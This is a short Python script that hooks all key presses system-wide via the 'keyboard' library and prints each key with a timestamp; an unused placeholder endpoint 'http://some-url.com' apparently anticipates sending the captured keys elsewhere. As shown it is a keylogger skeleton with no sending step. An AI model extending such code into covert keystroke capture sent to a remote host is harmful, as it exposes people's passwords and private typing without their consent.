import keyboard
from datetime import datetime

endpoint = "http://some-url.com"


def process_keyboard_press(event: keyboard.KeyboardEvent):
    print(event.name, datetime.fromtimestamp(event.time))


if __name__ == "__main__":
    keyboard.on_press(callback=process_keyboard_press)
    keyboard.wait()

